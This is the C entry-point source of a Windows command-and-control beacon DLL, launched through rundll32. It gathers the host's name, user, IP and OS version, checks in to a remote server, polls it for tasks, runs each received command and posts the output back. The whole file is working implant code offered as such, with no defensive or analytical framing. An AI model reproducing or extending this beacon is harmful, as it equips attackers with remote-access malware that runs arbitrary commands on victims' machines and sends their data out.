/*
 * main.c - Point d'entrée du beacon
 *
 * Utilisation: rundll32.exe beacon.dll,Start
 */

#include <windows.h>
#include <stdio.h>
#include "types.h"
#include "sysinfo.h"
#include "json.h"
#include "http.h"
#include "commands.h"

// Variables globales
static AgentInfo g_AgentInfo;
static volatile BOOL g_Running = TRUE;

// Debug prints
#ifdef DEBUG
#define DEBUG_PRINT(fmt, ...) printf("[BEACON] " fmt "\n", ##__VA_ARGS__)
#else
#define DEBUG_PRINT(fmt, ...)
#endif

static int do_checkin(void) {
    char json[MEDIUM_BUF];
    HttpResponse response;

    DEBUG_PRINT("Performing check-in...");
    DEBUG_PRINT("  Agent ID: %s", g_AgentInfo.agent_id);
    DEBUG_PRINT("  Hostname: %s", g_AgentInfo.hostname);
    DEBUG_PRINT("  Username: %s", g_AgentInfo.username);
    DEBUG_PRINT("  IP: %s", g_AgentInfo.internal_ip);
    DEBUG_PRINT("  OS: %s", g_AgentInfo.os_version);

    if (!json_build_checkin(&g_AgentInfo, json, sizeof(json))) {
        DEBUG_PRINT("Failed to build check-in JSON");
        return 0;
    }

    DEBUG_PRINT("Check-in JSON: %s", json);

    if (!http_post("/api/v1/checkin", json, &response)) {
        DEBUG_PRINT("Check-in failed: HTTP error");
        return 0;
    }

    DEBUG_PRINT("Check-in response: %s", response.body);
    return 1;
}

static int poll_for_task(TaskResponse* task) {
    char path[256];
    HttpResponse response;

    snprintf(path, sizeof(path), "/api/v1/tasks/%s", g_AgentInfo.agent_id);

    DEBUG_PRINT("Polling for tasks: %s", path);

    if (!http_get(path, &response)) {
        DEBUG_PRINT("Poll failed: HTTP error");
        return 0;
    }

    DEBUG_PRINT("Poll response: %s", response.body);

    if (!json_parse_task(response.body, task)) {
        DEBUG_PRINT("No task available");
        return 0;
    }

    DEBUG_PRINT("Task received: [%d] %s", task->task_id, task->command);
    return 1;
}

static int send_result(int task_id, const char* result, int success) {
    TaskResult taskResult;
    char json[LARGE_BUF];
    HttpResponse response;

    strncpy(taskResult.agent_id, g_AgentInfo.agent_id, sizeof(taskResult.agent_id) - 1);
    taskResult.task_id = task_id;
    strncpy(taskResult.result, result, sizeof(taskResult.result) - 1);
    taskResult.result[sizeof(taskResult.result) - 1] = '\0';
    taskResult.success = success;

    if (!json_build_result(&taskResult, json, sizeof(json))) {
        DEBUG_PRINT("Failed to build result JSON");
        return 0;
    }

    DEBUG_PRINT("Sending result: %s", json);

    if (!http_post("/api/v1/tasks/result", json, &response)) {
        DEBUG_PRINT("Failed to send result");
        return 0;
    }

    DEBUG_PRINT("Result sent successfully");
    return 1;
}

void BeaconMain(void) {
    TaskResponse task;
    char output[LARGE_BUF];
    int success;
    int checkin_attempts = 0;

    DEBUG_PRINT("=== BEACON STARTING ===");

    if (!http_init()) {
        DEBUG_PRINT("Failed to initialize HTTP");
        return;
    }

    if (!get_system_info(&g_AgentInfo)) {
        DEBUG_PRINT("Failed to get system info");
        http_cleanup();
        return;
    }

    DEBUG_PRINT("System info collected");

    while (g_Running && checkin_attempts < 5) {
        if (do_checkin()) {
            DEBUG_PRINT("Check-in successful!");
            break;
        }

        checkin_attempts++;
        DEBUG_PRINT("Check-in failed, attempt %d/5", checkin_attempts);
        Sleep(SLEEP_TIME_MS);
    }

    if (checkin_attempts >= 5) {
        DEBUG_PRINT("Check-in failed after 5 attempts, exiting");
        http_cleanup();
        return;
    }

    DEBUG_PRINT("Entering main loop (sleep: %d ms)", SLEEP_TIME_MS);

    while (g_Running) {
        Sleep(SLEEP_TIME_MS);

        if (poll_for_task(&task)) {
            DEBUG_PRINT("Executing command: %s", task.command);

            success = execute_command(task.command, output, sizeof(output));

            DEBUG_PRINT("Command output (%d bytes): %.100s%s",
                       (int)strlen(output),
                       output,
                       strlen(output) > 100 ? "..." : "");

            send_result(task.task_id, output, success);
        }
    }

    DEBUG_PRINT("Beacon stopping...");
    http_cleanup();
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    (void)hinstDLL;
    (void)lpvReserved;

    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            // Ne pas auto-démarrer, attendre l'appel explicite à Start()
            break;

        case DLL_PROCESS_DETACH:
            g_Running = FALSE;
            break;
    }

    return TRUE;
}

__declspec(dllexport) void CALLBACK Start(
    HWND hwnd,
    HINSTANCE hinst,
    LPSTR lpszCmdLine,
    int nCmdShow
) {
    (void)hwnd;
    (void)hinst;
    (void)lpszCmdLine;
    (void)nCmdShow;

    BeaconMain();
}

__declspec(dllexport) void Run(void) {
    BeaconMain();
}

#ifdef DEBUG
int main(void) {
    printf("[BEACON] Running as EXE for testing...\n");
    BeaconMain();
    return 0;
}
#endif